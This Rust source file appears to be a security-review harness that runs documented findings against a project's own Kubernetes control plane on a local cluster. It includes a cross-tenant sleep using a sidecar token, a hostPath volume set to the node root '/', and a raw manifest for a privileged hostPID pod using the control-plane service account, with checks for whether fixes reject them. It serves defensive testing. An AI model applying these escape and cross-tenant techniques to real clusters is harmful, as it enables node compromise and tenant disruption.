//! Adversarial review harness: drives the deployed control-plane API against a
//! kind cluster to demonstrate F1, F2c, and F4 end to end.
//!
//! Usage:
//!   advsec_attack setup      -- create victim + attacker classes/instances, wake both
//!   advsec_attack sleep-victim -- F1: sleep the victim using only the sidecar token
//!   advsec_attack operator-probe <token> -- F4: call the operator API with a given token

use std::{collections::HashMap, env, error::Error};

use control_plane::api::pb::{
    operator_control_plane_client::OperatorControlPlaneClient, persistent_volume_source_template,
    proxy_control_plane_client::ProxyControlPlaneClient,
    sidecar_control_plane_client::SidecarControlPlaneClient, ContainerPortTemplate,
    ContainerTemplate, CreateInstanceRequest, CreateWorkloadClassVersionRequest,
    GetInstanceRequest, HostPathVolumeSourceTemplate, ManifestTemplate,
    PersistentVolumeSourceTemplate, ProxyWakeInstanceRequest, ServicePortTemplate, ServiceTemplate,
    SidecarReportIdleRequest, SidecarTemplate, TemplateText, TemplateTextPart, VolumeTemplate,
    WorkloadClassVersionRef, WorkloadKind, WorkloadSleepPolicy, WorkloadValueFieldRule,
    WorkloadValueSchema,
};
use tonic::{metadata::MetadataValue, transport::Channel, Request};

const SIDECAR_PORT: u32 = 15000;
const APP_PORT: u32 = 8080;

type Res<T> = Result<T, Box<dyn Error + Send + Sync>>;

#[tokio::main]
async fn main() -> Res<()> {
    let endpoint = env::var("ADVSEC_ENDPOINT").unwrap_or_else(|_| "http://127.0.0.1:50051".into());
    let app_image =
        env::var("ADVSEC_APP_IMAGE").unwrap_or_else(|_| "sleepypods/advsec-app:advsec".into());
    let sidecar_image =
        env::var("ADVSEC_SIDECAR_IMAGE").unwrap_or_else(|_| "sleepypods/sidecar:advsec".into());
    let args: Vec<String> = env::args().skip(1).collect();
    let command = args.first().map(String::as_str).unwrap_or("setup");

    let channel = Channel::from_shared(endpoint.clone())?.connect().await?;

    match command {
        "setup" => setup(&channel, &app_image, &sidecar_image).await?,
        "sleep-victim" => sleep_victim(&channel).await?,
        "operator-probe" => {
            let token = args
                .get(1)
                .cloned()
                .unwrap_or_else(|| "sidecar-token".into());
            operator_probe(&channel, &token).await?;
        }
        "retest" => {
            let mut operator = operator(&channel, "operator-token");
            let attempt = operator
                .create_workload_class_version(authed(
                    Request::new(CreateWorkloadClassVersionRequest {
                        idempotency_key: "advsec-attacker-class-v2".into(),
                        class_id: "attacker2".into(),
                        version: 1,
                        default_values: HashMap::new(),
                        value_schema: Some(WorkloadValueSchema {
                            fields: HashMap::new(),
                            allow_extra: true,
                        }),
                        template_generation: 1,
                        template: Some(host_path_template("attacker2", &app_image, &sidecar_image)),
                        sleep_policy: Some(sleep_policy()),
                        exclusivity_keys: vec![],
                    }),
                    "operator-token",
                ))
                .await;
            match attempt {
                Ok(_) => println!("VULNERABLE: unrooted hostPath class was accepted"),
                Err(status) => println!(
                    "class creation REJECTED: code={:?} msg={}",
                    status.code(),
                    status.message()
                ),
            }
        }
        "rewake" => {
            // The malicious class predates the fix and is already in the DB.
            let mut operator = operator(&channel, "operator-token");
            let mut sidecar = SidecarControlPlaneClient::new(channel.clone());
            let current = operator
                .get_instance(authed(
                    Request::new(GetInstanceRequest {
                        instance_id: "attacker".into(),
                    }),
                    "operator-token",
                ))
                .await?
                .into_inner();
            println!(
                "attacker state={} generation={}",
                current.state, current.generation
            );
            let _ = sidecar
                .report_idle(authed(
                    Request::new(SidecarReportIdleRequest {
                        expected_generation: current.generation,
                        active_count: 0,
                    }),
                    "sidecar-token",
                ))
                .await;
            tokio::time::sleep(std::time::Duration::from_secs(12)).await;
            let cold = operator
                .get_instance(authed(
                    Request::new(GetInstanceRequest {
                        instance_id: "attacker".into(),
                    }),
                    "operator-token",
                ))
                .await?
                .into_inner();
            println!(
                "after sleep: state={} generation={}",
                cold.state, cold.generation
            );
            let mut proxy = ProxyControlPlaneClient::new(channel.clone());
            match proxy
                .wake_instance(authed(
                    Request::new(ProxyWakeInstanceRequest {
                        instance_id: "attacker".into(),
                        expected_generation: cold.generation,
                        backend_generation: None,
                    }),
                    "proxy-token",
                ))
                .await
            {
                Ok(response) => println!(
                    "VULNERABLE: wake succeeded {:?}",
                    response.into_inner().outcome
                ),
                Err(status) => println!(
                    "wake REJECTED: code={:?} msg={}",
                    status.code(),
                    status.message()
                ),
            }
        }
        "legit" => {
            // The shape kind_e2e_stateful uses: author fixes the root directory,
            // the instance selects a subdirectory beneath it.
            let mut operator = operator(&channel, "operator-token");
            let mut template = host_path_template("legit", &app_image, &sidecar_image);
            if let Some(volume) = template.volumes.first_mut() {
                volume.source = Some(PersistentVolumeSourceTemplate {
                    kind: Some(persistent_volume_source_template::Kind::HostPath(
                        HostPathVolumeSourceTemplate {
                            path: Some(TemplateText {
                                parts: vec![
                                    TemplateTextPart {
                                        kind: Some(control_plane::api::pb::template_text_part::Kind::Literal(
                                            "/tmp/sleepypods-advsec/".into(),
                                        )),
                                    },
                                    TemplateTextPart {
                                        kind: Some(control_plane::api::pb::template_text_part::Kind::InstanceValue(
                                            "data_dir".into(),
                                        )),
                                    },
                                ],
                            }),
                            r#type: Some(TemplateText {
                                parts: vec![TemplateTextPart {
                                    kind: Some(control_plane::api::pb::template_text_part::Kind::Literal(
                                        "DirectoryOrCreate".into(),
                                    )),
                                }],
                            }),
                        },
                    )),
                });
            }
            operator
                .create_workload_class_version(authed(
                    Request::new(CreateWorkloadClassVersionRequest {
                        idempotency_key: "advsec-legit-class".into(),
                        class_id: "legit".into(),
                        version: 1,
                        default_values: HashMap::new(),
                        value_schema: Some(WorkloadValueSchema {
                            fields: HashMap::new(),
                            allow_extra: true,
                        }),
                        template_generation: 1,
                        template: Some(template),
                        sleep_policy: Some(sleep_policy()),
                        exclusivity_keys: vec![],
                    }),
                    "operator-token",
                ))
                .await?;
            println!("rooted hostPath class ACCEPTED");
            operator
                .create_instance(authed(
                    Request::new(CreateInstanceRequest {
                        idempotency_key: "advsec-legit-instance".into(),
                        instance_id: "legit".into(),
                        workload_class: Some(WorkloadClassVersionRef {
                            class_id: "legit".into(),
                            version: 1,
                        }),
                        values: HashMap::from([("data_dir".to_owned(), "acme".to_owned())]),
                    }),
                    "operator-token",
                ))
                .await?;
            let current = operator
                .get_instance(authed(
                    Request::new(GetInstanceRequest {
                        instance_id: "legit".into(),
                    }),
                    "operator-token",
                ))
                .await?
                .into_inner();
            let mut proxy = ProxyControlPlaneClient::new(channel.clone());
            match proxy
                .wake_instance(authed(
                    Request::new(ProxyWakeInstanceRequest {
                        instance_id: "legit".into(),
                        expected_generation: current.generation,
                        backend_generation: None,
                    }),
                    "proxy-token",
                ))
                .await
            {
                Ok(response) => println!("wake: {:?}", response.into_inner().outcome),
                Err(status) => println!("wake FAILED: {status}"),
            }
        }
        "raw-probe" => {
            // F2a: a stolen operator token tries to introduce a privileged pod
            // through the raw-object escape hatch.
            let mut operator = operator(&channel, "operator-token");
            let mut template = plain_template("rawesc", &app_image, &sidecar_image);
            template.raw_objects = vec![control_plane::api::pb::RawKubernetesManifestTemplate {
                manifest: Some(TemplateText {
                    parts: vec![TemplateTextPart {
                        kind: Some(control_plane::api::pb::template_text_part::Kind::Literal(
                            "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rawesc\n\
                             spec:\n  selector:\n    matchLabels:\n      app: rawesc\n\
                               template:\n    metadata:\n      labels:\n        app: rawesc\n\
                                 spec:\n      hostPID: true\n      \
                             serviceAccountName: sleepypods-control-plane\n      containers:\n\
                             _       - name: escape\n          image: example/escape:1\n\
                                       securityContext:\n            privileged: true\n"
                                .replace('_', " ")
                                .to_owned(),
                        )),
                    }],
                }),
            }];
            match operator
                .create_workload_class_version(authed(
                    Request::new(CreateWorkloadClassVersionRequest {
                        idempotency_key: "advsec-rawesc-class".into(),
                        class_id: "rawesc".into(),
                        version: 1,
                        default_values: HashMap::new(),
                        value_schema: Some(WorkloadValueSchema {
                            fields: HashMap::new(),
                            allow_extra: true,
                        }),
                        template_generation: 1,
                        template: Some(template),
                        sleep_policy: Some(sleep_policy()),
                        exclusivity_keys: vec![],
                    }),
                    "operator-token",
                ))
                .await
            {
                Ok(_) => println!("VULNERABLE: privileged raw object class accepted"),
                Err(status) => println!(
                    "raw object class REJECTED: code={:?} msg={}",
                    status.code(),
                    status.message()
                ),
            }
        }
        "setup-f1" => {
            let mut operator = operator(&channel, "operator-token");
            let _ = operator
                .create_workload_class_version(authed(
                    Request::new(CreateWorkloadClassVersionRequest {
                        idempotency_key: "advsec-f1-class".into(),
                        class_id: "f1".into(),
                        version: 1,
                        default_values: HashMap::new(),
                        value_schema: Some(WorkloadValueSchema {
                            fields: HashMap::new(),
                            allow_extra: true,
                        }),
                        template_generation: 1,
                        template: Some(plain_template("f1", &app_image, &sidecar_image)),
                        sleep_policy: Some(sleep_policy()),
                        exclusivity_keys: vec![],
                    }),
                    "operator-token",
                ))
                .await;
            for instance_id in ["victim", "attacker"] {
                let _ = operator
                    .create_instance(authed(
                        Request::new(CreateInstanceRequest {
                            idempotency_key: format!("advsec-f1-{instance_id}"),
                            instance_id: instance_id.to_owned(),
                            workload_class: Some(WorkloadClassVersionRef {
                                class_id: "f1".into(),
                                version: 1,
                            }),
                            values: HashMap::new(),
                        }),
                        "operator-token",
                    ))
                    .await;
                let current = operator
                    .get_instance(authed(
                        Request::new(GetInstanceRequest {
                            instance_id: instance_id.to_owned(),
                        }),
                        "operator-token",
                    ))
                    .await?
                    .into_inner();
                let mut proxy = ProxyControlPlaneClient::new(channel.clone());
                match proxy
                    .wake_instance(authed(
                        Request::new(ProxyWakeInstanceRequest {
                            instance_id: instance_id.to_owned(),
                            expected_generation: current.generation,
                            backend_generation: None,
                        }),
                        "proxy-token",
                    ))
                    .await
                {
                    Ok(response) => {
                        println!("wake {instance_id}: {:?}", response.into_inner().outcome)
                    }
                    Err(status) => println!("wake {instance_id} FAILED: {status}"),
                }
            }
        }
        "http01" => {
            use control_plane::api::pb::{
                Http01ChallengeKey, PutHttp01ChallengeRequest, ResolveHttp01ChallengeRequest,
            };
            let mut operator = operator(&channel, "operator-token");
            let key = Http01ChallengeKey {
                host: "acme.example.com".into(),
                token: "advsec-token".into(),
            };
            operator
                .put_http01_challenge(authed(
                    Request::new(PutHttp01ChallengeRequest {
                        key: Some(key.clone()),
                        key_authorization: "advsec-token.keyauth".into(),
                        expires_at_unix_millis: 4_102_444_800_000,
                    }),
                    "operator-token",
                ))
                .await?;
            println!("challenge inserted by the ACME owner (operator token)");

            let mut proxy = ProxyControlPlaneClient::new(channel.clone());
            let resolved = proxy
                .resolve_http01_challenge(authed(
                    Request::new(ResolveHttp01ChallengeRequest {
                        key: Some(key.clone()),
                    }),
                    "proxy-token",
                ))
                .await?
                .into_inner()
                .challenge;
            println!(
                "resolved with the PROXY token: {:?}",
                resolved.map(|challenge| challenge.key_authorization)
            );

            match proxy
                .resolve_http01_challenge(authed(
                    Request::new(ResolveHttp01ChallengeRequest { key: Some(key) }),
                    "operator-token",
                ))
                .await
            {
                Ok(_) => println!("operator token also accepted on the proxy service"),
                Err(status) => println!(
                    "operator token on the proxy service: code={:?}",
                    status.code()
                ),
            }
        }
        "get" => {
            let id = args.get(1).cloned().unwrap_or_else(|| "victim".into());
            let instance = operator(&channel, "operator-token")
                .get_instance(GetInstanceRequest { instance_id: id })
                .await?
                .into_inner();
            println!(
                "state={:?} generation={}",
                instance.state, instance.generation
            );
        }
        other => return Err(format!("unknown command {other}").into()),
    }

    Ok(())
}

fn operator(channel: &Channel, token: &str) -> OperatorControlPlaneClient<Channel> {
    let _ = token;
    OperatorControlPlaneClient::new(channel.clone())
}

/// The credential the attacker read out of its own pod.
fn sidecar_credential() -> String {
    env::var("ADVSEC_SIDECAR_CREDENTIAL").unwrap_or_else(|_| "sidecar-token".into())
}

fn authed<T>(mut request: Request<T>, token: &str) -> Request<T> {
    let value: MetadataValue<_> = format!("Bearer {token}").parse().expect("ascii token");
    request.metadata_mut().insert("authorization", value);
    request
}

/// Creates two tenants. The victim is an ordinary workload. The attacker's
/// class routes an instance value straight into a hostPath PersistentVolume,
/// which is the typed-path variant of F2 (no raw_objects involved).
async fn setup(channel: &Channel, app_image: &str, sidecar_image: &str) -> Res<()> {
    let mut operator = operator(channel, "operator-token");

    // ---- victim: plain workload, no volumes ----
    operator
        .create_workload_class_version(authed(
            Request::new(CreateWorkloadClassVersionRequest {
                idempotency_key: "advsec-victim-class".into(),
                class_id: "victim".into(),
                version: 1,
                default_values: HashMap::new(),
                value_schema: Some(WorkloadValueSchema {
                    fields: HashMap::new(),
                    allow_extra: true,
                }),
                template_generation: 1,
                template: Some(plain_template("victim", app_image, sidecar_image)),
                sleep_policy: Some(sleep_policy()),
                exclusivity_keys: vec![],
            }),
            "operator-token",
        ))
        .await?;

    operator
        .create_instance(authed(
            Request::new(CreateInstanceRequest {
                idempotency_key: "advsec-victim-instance".into(),
                instance_id: "victim".into(),
                workload_class: Some(WorkloadClassVersionRef {
                    class_id: "victim".into(),
                    version: 1,
                }),
                values: HashMap::new(),
            }),
            "operator-token",
        ))
        .await?;

    // ---- attacker: class whose hostPath comes from an instance value ----
    operator
        .create_workload_class_version(authed(
            Request::new(CreateWorkloadClassVersionRequest {
                idempotency_key: "advsec-attacker-class".into(),
                class_id: "attacker".into(),
                version: 1,
                default_values: HashMap::new(),
                value_schema: Some(WorkloadValueSchema {
                    fields: HashMap::from([(
                        "data_dir".to_owned(),
                        WorkloadValueFieldRule {
                            required: true,
                            default_value: None,
                        },
                    )]),
                    allow_extra: false,
                }),
                template_generation: 1,
                template: Some(host_path_template("attacker", app_image, sidecar_image)),
                sleep_policy: Some(sleep_policy()),
                exclusivity_keys: vec![],
            }),
            "operator-token",
        ))
        .await?;

    // The tenant picks the node root instead of a per-tenant directory.
    operator
        .create_instance(authed(
            Request::new(CreateInstanceRequest {
                idempotency_key: "advsec-attacker-instance".into(),
                instance_id: "attacker".into(),
                workload_class: Some(WorkloadClassVersionRef {
                    class_id: "attacker".into(),
                    version: 1,
                }),
                values: HashMap::from([("data_dir".to_owned(), "/".to_owned())]),
            }),
            "operator-token",
        ))
        .await?;

    println!("created victim and attacker instances");

    let mut proxy = ProxyControlPlaneClient::new(channel.clone());
    for instance_id in ["victim", "attacker"] {
        let current = operator
            .get_instance(authed(
                Request::new(GetInstanceRequest {
                    instance_id: instance_id.to_owned(),
                }),
                "operator-token",
            ))
            .await?
            .into_inner();
        let response = proxy
            .wake_instance(authed(
                Request::new(ProxyWakeInstanceRequest {
                    instance_id: instance_id.to_owned(),
                    expected_generation: current.generation,
                    backend_generation: None,
                }),
                "proxy-token",
            ))
            .await;
        match response {
            Ok(response) => println!("wake {instance_id}: {:?}", response.into_inner().outcome),
            Err(status) => println!("wake {instance_id} FAILED: {status}"),
        }
    }

    Ok(())
}

/// F1: hold a sidecar credential, try to sleep somebody else's instance.
async fn sleep_victim(channel: &Channel) -> Res<()> {
    let mut sidecar = SidecarControlPlaneClient::new(channel.clone());
    let mut operator = operator(channel, "operator-token");

    let before = operator
        .get_instance(authed(
            Request::new(GetInstanceRequest {
                instance_id: "victim".into(),
            }),
            "operator-token",
        ))
        .await?
        .into_inner();
    println!(
        "victim before: state={} generation={}",
        before.state, before.generation
    );

    // Deliberately guess wrong to show the generation oracle.
    let probe = sidecar
        .report_idle(authed(
            Request::new(SidecarReportIdleRequest {
                expected_generation: 1,
                active_count: 0,
            }),
            &sidecar_credential(),
        ))
        .await?
        .into_inner();
    println!("oracle probe with wrong generation: {:?}", probe.outcome);

    let response = sidecar
        .report_idle(authed(
            Request::new(SidecarReportIdleRequest {
                expected_generation: before.generation,
                active_count: 0,
            }),
            &sidecar_credential(),
        ))
        .await?
        .into_inner();
    println!("sleep with correct generation: {:?}", response.outcome);

    let after = operator
        .get_instance(authed(
            Request::new(GetInstanceRequest {
                instance_id: "victim".into(),
            }),
            "operator-token",
        ))
        .await?
        .into_inner();
    println!(
        "victim after: state={} generation={}",
        after.state, after.generation
    );

    Ok(())
}

/// F4: does the operator API answer on the port pods must reach?
async fn operator_probe(channel: &Channel, token: &str) -> Res<()> {
    let mut operator = operator(channel, token);
    let result = operator
        .get_instance(authed(
            Request::new(GetInstanceRequest {
                instance_id: "victim".into(),
            }),
            token,
        ))
        .await;

    match result {
        Ok(response) => println!(
            "operator API ANSWERED with token {token:?}: {:?}",
            response.into_inner()
        ),
        Err(status) => println!(
            "operator API reachable, rejected token {token:?}: code={:?} msg={}",
            status.code(),
            status.message()
        ),
    }

    Ok(())
}

fn plain_template(name: &str, app_image: &str, sidecar_image: &str) -> ManifestTemplate {
    ManifestTemplate {
        workload: Some(control_plane::api::pb::WorkloadTemplate {
            kind: WorkloadKind::Deployment as i32,
            name: Some(literal(name)),
            replicas: Some(1),
            app_container: Some(app_container(app_image)),
        }),
        sidecar: Some(SidecarTemplate {
            name: "sleepypods-sidecar".into(),
            image: Some(literal(sidecar_image)),
            listen_port: SIDECAR_PORT,
            mode: None,
        }),
        service: Some(ServiceTemplate {
            name: Some(literal(name)),
            ports: vec![ServicePortTemplate {
                name: Some("http".into()),
                port: 80,
                target_port: APP_PORT,
            }],
        }),
        volumes: vec![],
        raw_objects: vec![],
    }
}

fn host_path_template(name: &str, app_image: &str, sidecar_image: &str) -> ManifestTemplate {
    ManifestTemplate {
        volumes: vec![VolumeTemplate {
            name: "data".into(),
            mount_path: Some(literal("/mnt/data")),
            pv_name: Some(literal(&format!("{name}-pv"))),
            pvc_name: Some(literal(&format!("{name}-pvc"))),
            access_modes: vec![1], // ReadWriteOnce
            capacity: Some(literal("1Gi")),
            reclaim_policy: 1, // Retain
            storage_class_name: Some(literal("advsec-static")),
            source: Some(PersistentVolumeSourceTemplate {
                kind: Some(persistent_volume_source_template::Kind::HostPath(
                    HostPathVolumeSourceTemplate {
                        // <-- the tenant writes this
                        path: Some(TemplateText {
                            parts: vec![TemplateTextPart {
                                kind: Some(
                                    control_plane::api::pb::template_text_part::Kind::InstanceValue(
                                        "data_dir".into(),
                                    ),
                                ),
                            }],
                        }),
                        r#type: None,
                    },
                )),
            }),
        }],
        ..plain_template(name, app_image, sidecar_image)
    }
}

fn app_container(app_image: &str) -> ContainerTemplate {
    ContainerTemplate {
        name: "app".into(),
        image: Some(literal(app_image)),
        ports: vec![ContainerPortTemplate {
            name: Some("http".into()),
            container_port: APP_PORT,
        }],
        env: vec![],
    }
}

fn sleep_policy() -> WorkloadSleepPolicy {
    WorkloadSleepPolicy {
        idle_timeout_ms: 600_000,
        idle_retry_backoff_ms: 5_000,
        drain_grace_timeout_ms: 5_000,
        idle_timeout_override: None,
    }
}

fn literal(value: &str) -> TemplateText {
    TemplateText {
        parts: vec![TemplateTextPart {
            kind: Some(control_plane::api::pb::template_text_part::Kind::Literal(
                value.to_owned(),
            )),
        }],
    }
}
